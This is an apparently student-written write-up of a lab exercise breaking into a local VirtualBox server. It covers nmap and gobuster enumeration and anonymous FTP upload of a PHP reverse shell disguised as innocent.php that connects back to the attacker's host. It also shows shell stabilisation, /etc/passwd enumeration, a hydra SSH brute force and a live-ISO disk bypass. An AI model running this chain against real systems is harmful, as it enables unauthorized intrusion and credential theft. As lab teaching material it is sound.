# Task 1: Gain access to a remote server.

After starting the machine, our first task is to identify the ip of the virtual machine in local subnet. I did that by simply doing an nmap scan on the local subnet, since we already know the machine will be hosting a server. There probably are better methods to do the same, but I found this one to be easy and fast in this case.  
`nmap 192.168.1.1/24`  
Within a few seconds, we see only 192.168.1.1 and 192.168.1.10 have open http ports, and since 192.168.1.1 is our router interface, the machine has to be 192.168.1.10.

Now we perform an indepth nmap scan of the ip, using service detection.  
`nmap 192.168.1.10 -sV -p-`  
~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:42:22:F8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
After running the following command, we find only open ports to be 21(ftp), 22(ssh) and 80(http). I tried finding the versions of these service on exploit-db but couldn't find a decent exploit and decided to investigate other things first. Using gobuster, we can perform directory enumeration on port 80 to find common directories.  
`gobuster dir -e -u http://192.168.1.10/ -w /usr/share/wordlists/dirb/common.txt`  
~~~
http://192.168.1.10/.hta                 (Status: 403) [Size: 277]
http://192.168.1.10/.htpasswd            (Status: 403) [Size: 277]
http://192.168.1.10/.htaccess            (Status: 403) [Size: 277]
http://192.168.1.10/files                (Status: 301) [Size: 312] [--> http://192.168.1.10/files/]
http://192.168.1.10/index.html           (Status: 200) [Size: 183]                                 
http://192.168.1.10/server-status        (Status: 403) [Size: 277] 
~~~
We found /files/ directory to be accessible by us containing a file 'site.html', which isn't particularly useful though.  
Next we investigate the ftp port and check if it allows anonymous connections:  
`ftp 192.168.1.10`  
~~~
Connected to 192.168.1.10.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.10]
Name (192.168.1.10:tinytrebuchet): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp            93 Oct 10 15:02 site.html
~~~
As we can see, the ftp allows anonymous access into the /files/ directory and we can now upload any file via ftp to the server and run it from /files/ on port 80. To get into the server, we will upload a simple php-reverse-shell on port 8888.  
`cp /usr/share/webshells/php/php-reverse-shell.php ~/innocent.php`  
Then we modify the reverse-shell script and change ip to our host os ip (192.168.1.6 for our case found using `ip addr`) and port to 8888. Then finally upload it the server using the ftp connection.  
`put innocent.php`  
~~~
local: innocent.php remote: innocent.php
200 PORT command successful
150 Opening BINARY mode data connection for hash.txt
226 Transfer complete
5493 bytes sent in 0.00 secs (7.9493 kB/s)
~~~
Now, we open a netcat listener on our host os at port 8888 using and then execute the reverse-shell from the http://192.168.10/files/ directory.
We should get a successful connect on our host os:
`nc -lvp 8888`
~~~
listening on [any] 8888 ...
192.168.1.10: inverse host lookup failed: Unknown host
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.10] 37384
Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 02:56:34 up 39 min,  0 users,  load average: 0.08, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
~~~
A good practice is to stabilize the reverse shell, which can be done easily if the server has python installed, that way we have support for tab-autocompletion and Ctrl-C doesn't close our netcat listener. This can be done by executing the following commands:  
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ export TERM=xterm
```
Then, we press Ctrl-Z on our keyboard to background the reverse shell, modify the stty on your host os, and then foreground:  
`stty raw -echo; fg`  
After this, we should have a fully stabilized reverse-shell.  

We are logged in as www-data: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, which doesn't have a lot of permissions, so I thought we might need to perform privilege escalation later. But first, we checked the machine for some basic info.  
`cat /etc/passwd`
~~~
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
ftp:x:1001:1001:,,,:/home/ftp:/bin/bash
colord:x:110:119:colord colour management daemon,,,:/var/lib/colord:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
dk:x:1000:1000:dk:/home/dk:/bin/bash
~~~
`cd /home/; ls -al`
~~~
drwxr-xr-x  3 root root   4096 Oct 10 08:55 .
drwxr-xr-x 23 root root   4096 Oct 10 09:17 ..
-rwxr-xr-x  1 root root 211528 Aug  5 04:35 .fishy.vt
-rw-r-----  1 root root  16384 Aug  5 08:08 .fishy.vt.swp
drwxr-x---  4 dk   dk     4096 Oct 15 20:48 dk
-rwxr-xr-x  1 root root     32 Aug  5 08:06 runme.sh
~~~
We see the machine has another user named 'dk' and we don't have access to his home directory. The key should be in there somewhere. There's also a runme.sh script which just cats .fishy.vt slowly using pv, as an asciimation. However the file has an interesting 32 digit base64 encoded string written in it on top : 'mpthRrM4f0XPQem4ISiZL3kxDgMLrX6S'. I checked if it's the password of any user, dk or root, by doing `su <user>` and putting this as password, but no use. I also tried to bruteforce the password by using hydra on ssh port, but without any success (the connection seemed to be possible throttled).  
`hydra -l dk -P /usr/share/wordlists/rockyou.txt 192.168.1.10 -t 4 -vV -I -f ssh`  
I decided to investigate for privilege escalation on the machine. I used the 'linpeas.sh' and 'LinEnum.sh' scripts available on github to find any vulnerablites. I put them in the /files/ directory using the ftp connection from host os, and then copied them from /var/www/html/files/ to /tmp/ on the server. I checked for any exploitable SUID file or crontabs or anyother vulnerablity in general but couldn't find anything much useful and exploitable. I even tried to look for kernerl exploits from exploit-db but with no success. After a lot of thinking and finding, and since I was running short on time, I finally gave up on this.  


## Method 2
I actually thought of this method immediately when I saw the ova file, but decided to save it for last, as it doesn't involving finding vulnerablites in the server, but is rather a dirty trick, but it still allowed me to get the key in under 5 mins, so I thought to share it here.  
The plan was, if the machine has unencrypted file system, we could simple boot from a live-usb to access the filesystem and get the key from dk's home directory. I used my handy arch-iso (I use arch btw 😛), put that into virtual machine's storage devices under 'Controller: IDE', marked it as 'Live CD/DVD' on right pane, saved the changes and rebooted the machine. As expected, the machine booted from live arch iso, and we could easily get the file by mounting the file system.  
![Screenshot from 2021-10-18 12-08-12](https://user-images.githubusercontent.com/73381089/137680984-ff0af756-6436-4bde-b373-a02762fa61b3.png)
